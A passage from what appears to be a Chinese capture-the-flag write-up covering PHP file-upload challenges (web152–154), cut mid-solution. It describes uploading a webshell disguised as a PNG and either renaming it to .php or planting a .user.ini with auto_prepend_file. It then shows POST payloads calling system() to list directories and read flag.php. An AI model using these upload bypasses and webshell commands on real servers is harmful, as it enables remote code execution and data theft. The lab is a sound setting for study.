&lt;p&gt;&lt;strong&gt;4.音频&amp;#x2F;视频类型:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;audio&amp;#x2F;mpeg: MP3 音频&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;video&amp;#x2F;mp4: MP4 视频&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此，这一题不能通过修改源代码直接上传php木马解题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同样上传 &lt;code&gt;muma.png&lt;/code&gt; 并抓包，在Repeater中修改 &lt;code&gt;png&lt;/code&gt; 为 &lt;code&gt;php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818193032111.png&#34; alt=&#34;image-20250818193032111&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看flag&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/muma.php

#POST
a=system(&amp;quot;tac ../flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818192416603.png&#34; alt=&#34;image-20250818192416603&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web153&#34;&gt;&lt;a href=&#34;#web153&#34; class=&#34;headerlink&#34; title=&#34;web153&#34;&gt;&lt;/a&gt;web153&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;php.ini&lt;/code&gt;：全局配置文件，影响整个 PHP 环境。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;.user.ini&lt;/code&gt;：目录级配置文件，只影响所在目录及子目录（类似 &lt;code&gt;.htaccess&lt;/code&gt;）；用户可以通过 &lt;code&gt;.user.ini&lt;/code&gt; 文件来设置特定目录和子目录下的 PHP 配置。这些设置会覆盖全局 &lt;code&gt;php.ini&lt;/code&gt; 的相应配置。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;可以通过配置选项使每个php文件头或文件尾都进行文件包含&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;auto_prepend_file = &amp;lt;filename&amp;gt;         //包含在文件头
auto_append_file = &amp;lt;filename&amp;gt;          //包含在文件尾
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;原理：上传 &lt;code&gt;.user.ini&lt;/code&gt;，指定一个文件（如 &lt;code&gt;a.jpg&lt;/code&gt;），那么该文件就会被包含在要执行的php文件中（如 &lt;code&gt;index.php&lt;/code&gt;），类似于在&lt;code&gt;index.php&lt;/code&gt; 中插入一句：&lt;code&gt;require(./a.jpg)&lt;/code&gt; ；&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;PHP 执行当前目录的任意 &lt;code&gt;.php&lt;/code&gt; 文件时，会 &lt;code&gt;require a.jpg&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;这两个设置的区别只是在于 &lt;code&gt;auto_prepend_file&lt;/code&gt; 是在文件前插入；&lt;code&gt;auto_append_file&lt;/code&gt; 在文件最后插入（当文件调用的有 &lt;code&gt;exit()&lt;/code&gt; 时，该设置无效）&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;所以要求当前目录必须要有php文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;.user.ini&lt;/code&gt; 可以把指定的一个文件包含到目录下&amp;#x3D;&amp;#x3D;所有&amp;#x3D;&amp;#x3D;会以php执行的文件中（比如 &lt;code&gt;index.php&lt;/code&gt;、&lt;code&gt;test.php&lt;/code&gt;），当访问 &lt;code&gt;index.php&lt;/code&gt; 后，这个被指定的文件，无论后缀是什么，都会以php的方式进行读取，所以可以绕过后端检测&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;能够访问 &lt;code&gt;靶机/upload&lt;/code&gt; ，说明 &lt;code&gt;upload&lt;/code&gt; 目录下存在 &lt;code&gt;.php&lt;/code&gt; 文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或者可以通过扫描 &lt;code&gt;靶机/upload&lt;/code&gt; 后台，看到目录下有一个 &lt;code&gt;index.php&lt;/code&gt; 文件&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818222405430.png&#34; alt=&#34;image-20250818222405430&#34; style=&#34;zoom:80%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1.png&lt;/code&gt; 内容&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;auto_prepend_file=muma.png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818215940876.png&#34; alt=&#34;image-20250818215940876&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;muma.png&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818220259213.png&#34; alt=&#34;image-20250818220259213&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/index.php

#POST
a=system(&amp;quot;ls ../&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818221044605.png&#34; alt=&#34;image-20250818221044605&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/index.php

#POST
a=system(&amp;quot;tac ../flag.php&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818221114730.png&#34; alt=&#34;image-20250818221114730&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web154&#34;&gt;&lt;a href=&#34;#web154&#34; class=&#34;headerlink&#34; title=&#34;web154&#34;&gt;&lt;/a&gt;web154&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;1.png&lt;/code&gt; 内容&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;auto_prepend_file=muma.png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;1.png&lt;/code&gt; 并抓包，重命名为 &lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818224418932.png&#34; alt=&#34;image-20250818224418932&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;muma.png&lt;/code&gt; ，出现 &lt;code&gt;文件内容不合理&lt;/code&gt; 提示&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818224735310.png&#34; alt=&#34;image-20250818224735310&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
